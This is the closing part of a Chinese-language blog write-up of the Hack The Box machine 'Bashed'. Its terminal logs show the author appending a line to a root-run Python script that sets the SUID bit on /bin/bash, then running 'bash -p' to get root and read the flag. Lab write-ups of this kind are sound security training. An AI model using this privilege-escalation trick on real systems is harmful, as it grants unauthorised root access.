+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">scriptmanager@bashed:~$ cd /<br>cd /<br>scriptmanager@bashed:/$ ls -la<br>ls -la<br>total <span class="hljs-number">92</span><br>drwxr-xr-x  <span class="hljs-number">23</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x  <span class="hljs-number">23</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>-rw-------   <span class="hljs-number">1</span> root          root            <span class="hljs-number">174</span> Jun <span class="hljs-number">14</span>  <span class="hljs-number">2022</span> .bash_history<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> bin<br>drwxr-xr-x   <span class="hljs-number">3</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> boot<br>drwxr-xr-x  <span class="hljs-number">19</span> root          root           <span class="hljs-number">4140</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">30</span> dev<br>drwxr-xr-x  <span class="hljs-number">89</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> etc<br>drwxr-xr-x   <span class="hljs-number">4</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> home<br>lrwxrwxrwx   <span class="hljs-number">1</span> root          root             <span class="hljs-number">32</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> initrd.img -&gt; boot/initrd.img<span class="hljs-number">-4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-62</span>-generic<br>drwxr-xr-x  <span class="hljs-number">19</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> lib<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> lib64<br>drwx------   <span class="hljs-number">2</span> root          root          <span class="hljs-number">16384</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> lost+found<br>drwxr-xr-x   <span class="hljs-number">4</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> media<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> mnt<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> opt<br>dr-xr-xr-x <span class="hljs-number">174</span> root          root              <span class="hljs-number">0</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">30</span> proc<br>drwx------   <span class="hljs-number">3</span> root          root           <span class="hljs-number">4096</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span> root<br>drwxr-xr-x  <span class="hljs-number">18</span> root          root            <span class="hljs-number">500</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">30</span> run<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> sbin<br>drwxrwxr--   <span class="hljs-number">2</span> scriptmanager scriptmanager  <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> scripts<br>drwxr-xr-x   <span class="hljs-number">2</span> root          root           <span class="hljs-number">4096</span> Feb <span class="hljs-number">15</span>  <span class="hljs-number">2017</span> srv<br>dr-xr-xr-x  <span class="hljs-number">13</span> root          root              <span class="hljs-number">0</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">30</span> sys<br>drwxrwxrwt  <span class="hljs-number">10</span> root          root           <span class="hljs-number">4096</span> May <span class="hljs-number">19</span> <span class="hljs-number">02</span>:<span class="hljs-number">05</span> tmp<br>drwxr-xr-x  <span class="hljs-number">10</span> root          root           <span class="hljs-number">4096</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> usr<br>drwxr-xr-x  <span class="hljs-number">12</span> root          root           <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> var<br>lrwxrwxrwx   <span class="hljs-number">1</span> root          root             <span class="hljs-number">29</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> vmlinuz -&gt; boot/vmlinuz<span class="hljs-number">-4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-62</span>-generic<br>scriptmanager@bashed:/$ cd scripts<br>cd scripts<br>scriptmanager@bashed:/scripts$ ls -la<br>ls -la<br>total <span class="hljs-number">16</span><br>drwxrwxr--  <span class="hljs-number">2</span> scriptmanager scriptmanager <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .<br>drwxr-xr-x <span class="hljs-number">23</span> root          root          <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>-rw-r--r--  <span class="hljs-number">1</span> scriptmanager scriptmanager   <span class="hljs-number">58</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> test.py<br>-rw-r--r--  <span class="hljs-number">1</span> root          root            <span class="hljs-number">12</span> May <span class="hljs-number">19</span> <span class="hljs-number">02</span>:<span class="hljs-number">05</span> test.txt<br>scriptmanager@bashed:/scripts$ cat test.py<br>cat test.py<br>f = open(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>f.write(<span class="hljs-string">&quot;testing 123!&quot;</span>)<br>f.close<br>scriptmanager@bashed:/scripts$ cat test.txt<br>cat test.txt<br>testing <span class="hljs-number">123</span>!<br></code></pre></td></tr></table></figure>
+
+<p>15、这里直接写入到脚本里一行代码进行提权</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">scriptmanager@bashed:/scripts$ echo <span class="hljs-string">&quot;import os;os.system(&#x27;chmod u+s /bin/bash&#x27;)&quot;</span> &gt;&gt; ./test.py<br>&lt;ts$ echo <span class="hljs-string">&quot;import os;os.system(&#x27;chmod u+s /bin/bash&#x27;)&quot;</span> &gt;&gt; ./test.py          <br>scriptmanager@bashed:/scripts$ cat test.py<br>cat test.py<br>f = open(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>f.write(<span class="hljs-string">&quot;testing 123!&quot;</span>)<br>f.close<br>import os;os.system(<span class="hljs-string">&#x27;chmod u+s /bin/bash&#x27;</span>)<br>scriptmanager@bashed:/scripts$ ls -la /bin/bash<br>ls -la /bin/bash<br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">1037528</span> Jun <span class="hljs-number">24</span>  <span class="hljs-number">2016</span> /bin/bash<br>scriptmanager@bashed:/scripts$ <br></code></pre></td></tr></table></figure>
+
+<p>16、获取最终flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">scriptmanager@bashed:/scripts$ bash -p<br>bash -p<br>id<br>uid=<span class="hljs-number">1001</span>(scriptmanager) gid=<span class="hljs-number">1001</span>(scriptmanager) euid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">1001</span>(scriptmanager)<br>cd /root<br>ls -la<br>total <span class="hljs-number">28</span><br>drwx------  <span class="hljs-number">3</span> root root <span class="hljs-number">4096</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span> .<br>drwxr-xr-x <span class="hljs-number">23</span> root root <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> root root    <span class="hljs-number">9</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .bash_history -&gt; /dev/null<br>-rw-r--r--  <span class="hljs-number">1</span> root root <span class="hljs-number">3121</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .bashrc<br>drwxr-xr-x  <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Jun  <span class="hljs-number">2</span>  <span class="hljs-number">2022</span> .nano<br>-rw-r--r--  <span class="hljs-number">1</span> root root  <span class="hljs-number">148</span> Aug <span class="hljs-number">17</span>  <span class="hljs-number">2015</span> .profile<br>-rw-r--r--  <span class="hljs-number">1</span> root root   <span class="hljs-number">66</span> Dec  <span class="hljs-number">4</span>  <span class="hljs-number">2017</span> .selected_editor<br>-r--------  <span class="hljs-number">1</span> root root   <span class="hljs-number">33</span> May <span class="hljs-number">18</span> <span class="hljs-number">23</span>:<span class="hljs-number">31</span> root.txt<br>cat root.txt<br><span class="hljs-number">3383e7</span>ca075694896c2fe89f5bb20946<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/118</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Bashed-htb-writeup</div>
+      <div>https://sh1yan.top/2024/05/20/Bashed-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/21/Netmon-htb-writeup/" title="Netmon-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Netmon-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/16/Blackfield-htb-writeup/" title="Blackfield-htb-writeup">
+                        <span class="hidden-mobile">Blackfield-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
